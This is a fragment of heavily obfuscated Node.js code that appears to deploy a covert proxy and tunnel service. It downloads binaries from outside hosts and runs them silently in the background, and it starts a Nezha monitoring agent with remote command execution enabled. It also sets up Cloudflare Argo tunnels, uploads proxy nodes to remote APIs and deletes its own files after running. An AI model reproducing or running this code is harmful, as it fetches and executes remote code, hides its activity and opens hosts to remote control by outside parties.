_0x5d4af7={_0x2c832d:0x21c,_0x2c469b:0x1c3,_0x1bbe0c:0x1df,_0x187e7b:0x1b7},_0x5aba28={_0x10635a:0x240,_0x295e29:0x217};setTimeout(()=>{const _0x581f51={_0x28c823:0x1a7,_0x301eb1:0x240,_0x283a18:0x217},_0x3ac37e=_0x1a75,_0x31dd9e=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x31dd9e['push'](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x31dd9e[_0x3ac37e(_0x5d4af7._0x2c832d)](phpPath);process[_0x3ac37e(_0x5d4af7._0x2c469b)]===_0x3ac37e(0x230)?exec(_0x3ac37e(0x18d)+_0x31dd9e[_0x3ac37e(_0x5d4af7._0x1bbe0c)]('\x20')+_0x3ac37e(_0x5d4af7._0x187e7b),_0x5ddaa8=>{const _0x188d56=_0x3ac37e;console[_0x188d56(0x201)](),console[_0x188d56(0x240)](_0x188d56(0x1a7)),console[_0x188d56(_0x5aba28._0x10635a)](_0x188d56(_0x5aba28._0x295e29));}):exec(_0x3ac37e(0x216)+_0x31dd9e[_0x3ac37e(0x1df)]('\x20')+_0x3ac37e(0x225),_0x566feb=>{const _0x10ea82=_0x3ac37e;console[_0x10ea82(0x201)](),console['log'](_0x10ea82(_0x581f51._0x28c823)),console[_0x10ea82(_0x581f51._0x301eb1)](_0x10ea82(_0x581f51._0x283a18));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x5e3e7c={_0x6f2b74:0x240,_0x210fa7:0x1e9},_0x1ad528=_0x2afa27;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x1ad528(_0x5e3e7c._0x6f2b74)]('Skipping\x20adding\x20automatic\x20access\x20task');return;}try{const _0x33be30=await axios[_0x1ad528(0x20e)](_0x1ad528(0x235),{'url':PROJECT_URL},{'headers':{'Content-Type':'application/json'}});return console['log'](_0x1ad528(_0x5e3e7c._0x210fa7)),_0x33be30;}catch(_0xdea063){return console[_0x1ad528(0x1f1)](_0x1ad528(0x19c)+_0xdea063[_0x1ad528(0x1d3)]),null;}}function _0xf312(){const _0x218a2d=['message','includes','--tls','listen','config.json','\x0a\x0avmess://','application/json','statSync','charAt','status','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','337653LYkTpe','join','\x0a\x20\x20tunnel:\x20','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','1084530HUmeMM','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','from','https+local://8.8.8.8/dns-query','php\x20running\x20error:\x20','countryCode','\x0a\x0atrojan://','automatic\x20access\x20task\x20added\x20successfully','direct','https://arm64.ssss.nyc.mn/v1','/tunnel.yml\x20run','\x20failed:\x20','boot.log','2053','writeFileSync','error','utf-8','nohup\x20','trojan','\x20-c\x20','SUB_PATH','random','mkdirSync','FILE_PATH','/sub.txt\x20saved\x20successfully','/config.json\x20>/dev/null\x202>&1\x20&','https://amd64.ssss.nyc.mn/v1','unlink','response','blackhole','https://amd64.ssss.nyc.mn/web','clear','test','Empowerment\x20success\x20for\x20','2cmgdGK','/dev/null','CFPORT','NEZHA_KEY','Download\x20','fileName','arm','AUTO_ACCESS','NEZHA\x20variable\x20is\x20empty,skip\x20running','https://ipapi.co/json/','post','&fp=firefox&type=ws&host=','org','send','\x22\x20>\x20/dev/null\x202>&1','55iNombx','env','\x20is\x20running','rm\x20-rf\x20','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','2083','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','&path=%2Fvless-argo%3Fed%3D2560#','push','http\x20server\x20is\x20running\x20on\x20port:','267727wpZPMv','?encryption=none&security=tls&sni=','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','Error\x20executing\x20command:\x20','readFileSync','SERVER_PORT','/trojan-argo','\x20>/dev/null\x202>&1','axios','vless','8443','data','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','/vmess-argo?ed=2560','match','\x0aclient_secret:\x20','vmess','tcp','win32','country_code','true','catch','tunnel.json','https://oooo.serv00.net/add-url','https://arm64.ssss.nyc.mn/web','/api/delete-nodes','/vmess-argo','stringify','readdirSync','&path=%2Ftrojan-argo%3Fed%3D2560#','filter','none','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','https://arm64.ssss.nyc.mn/bot','log','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','UUID','isFile','floor','unlinkSync','/vless-argo','888','Content-Type','path','cdns.doon.eu.org','56UZopoS','node','existsSync','has','PROJECT_URL','Unknown','127.0.0.1','/api/add-subscriptions','Hello\x20world!','tls','pop','del\x20/f\x20/q\x20','TunnelSecret','nodejs.bocai.ggff.net','aarch64','basename','length','ARGO_DOMAIN:','firefox','2096','child_process','pipe','chmod','get','\x20-c\x20\x22','list.txt','Add\x20automatic\x20access\x20task\x20faild:\x20','\x20successfully','5409750hSjXbD','finish','\x20-p\x20','CFIP','forEach','ArgoDomain:','https://amd64.ssss.nyc.mn/bot','arch','ARGO_PORT','App\x20is\x20running','pkill\x20-f\x20\x22[','Subscription\x20uploaded\x20successfully','config.yaml','quic','toString','abcdefghijklmnopqrstuvwxyz','UPLOAD_URL','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','success','split','base64','\x20>/dev/null\x202>&1\x20&','NEZHA_SERVER','\x20already\x20exists','Error\x20downloading\x20files:','\x20>\x20nul\x202>&1','unshift','342JdVxmH','https://amd64.ssss.nyc.mn/agent','9afd1229-b893-40c1-84dd-51e7ce666666','all','440664sTMioP','PORT','?security=tls&sni=','2087','./tmp','set','platform','Unhandled\x20error\x20in\x20startserver:','NAME','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','.exe\x20>\x20nul\x202>&1','54068ojIxWJ','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','Nodes\x20uploaded\x20successfully','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','http','text/plain;\x20charset=utf-8','sub.txt','17702421aCLVWP','/api/add-nodes','substring'];_0xf312=function(){return _0x218a2d;};return _0xf312();}async function startserver(){const _0x30eb06=_0x2afa27;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x2d3ff8){console[_0x30eb06(0x1f1)]('Error\x20in\x20startserver:',_0x2d3ff8);}}startserver()[_0x2afa27(0x233)](_0x28f5e3=>{const _0x3a46d3={_0x29d1e9:0x1c4},_0xd7e1c0=_0x2afa27;console['error'](_0xd7e1c0(_0x3a46d3._0x29d1e9),_0x28f5e3);}),app[_0x2afa27(0x1d6)](PORT,()=>console['log'](_0x2afa27(0x21d)+PORT+'!'));
